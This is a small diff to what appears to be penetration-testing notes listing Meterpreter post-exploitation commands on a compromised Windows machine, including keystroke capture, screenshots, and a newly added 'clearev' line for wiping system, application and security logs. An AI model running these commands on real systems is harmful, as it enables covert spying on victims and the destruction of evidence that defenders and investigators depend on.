@@ -256,6 +256,7 @@ meterpreter> shell ### it will look like we are in Windows , we can capture key 
 meterpreter> help ## to see more options
 meterpreter> keyscan_start
 meterpreter> keyscan_stop
+meterpreter> clearev #will clear system, application and security logs on a Windows system.
 meterpreter> screenshot ### and much more 
 
  
